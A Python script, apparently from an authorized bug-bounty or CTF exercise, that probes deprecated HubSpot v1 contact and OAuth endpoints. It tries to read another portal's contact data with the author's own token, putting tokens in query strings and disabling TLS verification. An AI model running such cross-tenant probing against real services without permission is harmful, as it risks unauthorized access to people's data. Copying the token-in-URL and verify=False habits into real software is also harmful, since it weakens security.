#!/usr/bin/env python3
"""
Test Legacy v1 API Endpoints
Based on findings from HubSpot's GitHub repos
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')

print("="*80)
print("Testing Legacy v1 API Endpoints")
print("="*80)
print("\nBased on HubSpot's own GitHub repos (hapipy, oauth-quickstart, sprocket)")
print("These are DEPRECATED endpoints that might have weaker security")
print("="*80)

findings = []

# ============================================================================
# LEGACY ENDPOINTS FROM GITHUB ANALYSIS
# ============================================================================

# From hapipy (old Python SDK)
legacy_endpoints = [
    # v1 contacts list endpoint
    {
        'name': 'v1 All Contacts List',
        'url': f'https://api.hubapi.com/contacts/v1/lists/all/contacts/all?count=100&portalId={TARGET_PORTAL}',
        'method': 'GET',
        'source': 'hapipy/hapi/utils.py'
    },
    # v1 with access_token in query (legacy auth)
    {
        'name': 'v1 All Contacts with token in query',
        'url': f'https://api.hubapi.com/contacts/v1/lists/all/contacts/all?count=100&access_token={ACCESS_TOKEN}&portalId={TARGET_PORTAL}',
        'method': 'GET',
        'source': 'hapipy legacy pattern'
    },
    # v1 with hapikey (very old auth method)
    {
        'name': 'v1 All Contacts with hapikey',
        'url': f'https://api.hubapi.com/contacts/v1/lists/all/contacts/all?count=100&hapikey={ACCESS_TOKEN}&portalId={TARGET_PORTAL}',
        'method': 'GET',
        'source': 'sprocket base_resource.py'
    },
    # v1 specific contact
    {
        'name': 'v1 Contact by ID',
        'url': f'https://api.hubapi.com/contacts/v1/contact/vid/1/profile?portalId={TARGET_PORTAL}',
        'method': 'GET',
        'source': 'Common v1 pattern'
    },
    # v1 batch contacts
    {
        'name': 'v1 Batch Contacts',
        'url': f'https://api.hubapi.com/contacts/v1/contact/vids/batch/?vid=1&vid=2&vid=3&portalId={TARGET_PORTAL}',
        'method': 'GET',
        'source': 'v1 batch pattern'
    },
    # v1 search
    {
        'name': 'v1 Search Contacts',
        'url': f'https://api.hubapi.com/contacts/v1/search/query?q=&count=100&portalId={TARGET_PORTAL}',
        'method': 'GET',
        'source': 'v1 search pattern'
    },
    # v1 contact properties
    {
        'name': 'v1 Contact Properties',
        'url': f'https://api.hubapi.com/contacts/v1/properties?portalId={TARGET_PORTAL}',
        'method': 'GET',
        'source': 'v1 properties pattern'
    },
]

# ============================================================================
# TEST EACH ENDPOINT
# ============================================================================

print(f"\n[*] Testing {len(legacy_endpoints)} legacy endpoints...\n")

headers_bearer = {
    'Authorization': f'Bearer {ACCESS_TOKEN}',
    'User-Agent': 'HubSpot-Legacy-Test'
}

for i, endpoint in enumerate(legacy_endpoints, 1):
    print(f"[{i}/{len(legacy_endpoints)}] Testing: {endpoint['name']}")
    print(f"  Source: {endpoint['source']}")
    print(f"  URL: {endpoint['url'][:100]}...")

    try:
        # Test with Bearer token
        r = requests.get(endpoint['url'], headers=headers_bearer, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()

                # Check if we got actual data
                if data:
                    print(f"  SUCCESS - Got response!")

                    # Check for contacts data
                    if 'contacts' in data or 'properties' in json.dumps(data).lower():
                        print(f"  *** CONTAINS CONTACT DATA ***")

                        # Check if it's from target portal
                        data_str = json.dumps(data)
                        if 'firstname' in data_str or 'super_secret' in data_str:
                            print(f"  *** POTENTIAL FLAG DATA FOUND ***")
                            findings.append({
                                'endpoint': endpoint['name'],
                                'url': endpoint['url'],
                                'status': r.status_code,
                                'data': data
                            })

                        print(f"  Response preview: {json.dumps(data, indent=2)[:300]}...")
            except:
                print(f"  Response (not JSON): {r.text[:200]}")

        elif r.status_code == 401:
            print(f"  401 - Unauthorized (expected)")
        elif r.status_code == 403:
            print(f"  403 - Forbidden (expected)")
        elif r.status_code == 404:
            print(f"  404 - Not Found (endpoint might be removed)")
        else:
            print(f"  Unusual status code: {r.status_code}")
            print(f"  Response: {r.text[:100]}")

    except Exception as e:
        print(f"  Error: {str(e)[:100]}")

    print()

# ============================================================================
# ADDITIONAL TESTS - OAuth Endpoints
# ============================================================================

print("\n" + "="*80)
print("Testing OAuth Endpoints (from oauth-quickstart)")
print("="*80)

oauth_endpoints = [
    'https://api.hubapi.com/oauth/v1/access-tokens',
    'https://api.hubapi.com/oauth/v1/refresh-tokens',
]

for url in oauth_endpoints:
    print(f"\n[*] Testing: {url}")
    try:
        r = requests.get(f"{url}/{ACCESS_TOKEN}", verify=False, timeout=10)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  Response: {r.text[:200]}")
    except Exception as e:
        print(f"  Error: {str(e)[:50]}")

# ============================================================================
# SUMMARY
# ============================================================================

print("\n" + "="*80)
print("SUMMARY")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} POTENTIAL BYPASSES ***\n")

    for i, finding in enumerate(findings, 1):
        print(f"{i}. {finding['endpoint']}")
        print(f"   URL: {finding['url'][:80]}...")
        print(f"   Status: {finding['status']}")
        print(f"   Data preview: {json.dumps(finding['data'], indent=3)[:200]}...")
        print()

    # Save findings
    with open('/home/user/Hub/findings/legacy_api_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    print(f"\nSaved to: findings/legacy_api_findings.json")
else:
    print("\nNo bypasses found with legacy v1 endpoints.")
    print("\nThis means:")
    print("  - v1 APIs are either disabled or properly secured")
    print("  - Authorization is enforced even on deprecated endpoints")
    print("  - HubSpot has good security practices for legacy code")

print("\n" + "="*80)
print("NEXT RECOMMENDATIONS")
print("="*80)
print("""
1. If any v1 endpoints returned 200:
   - Analyze the response carefully
   - Check if data is from target portal or your portal
   - Try different parameter combinations

2. Check HubSpot's GitHub Issues:
   - Search for: "authorization", "security", "v1", "deprecated"
   - Look for disclosed security issues

3. Manual browser testing:
   - Visit the working v1 endpoints in browser
   - Check network tab for additional API calls
   - Look for client-side validation that might be bypassable

4. Test v2 APIs:
   - v2 might exist between v1 (deprecated) and v3 (current)
   - Could have authorization bugs

IMPORTANT: After testing, you should:
  - REVOKE your GitHub tokens (you exposed them)
  - Generate new tokens for future use
  - Never post tokens in plain text
""")
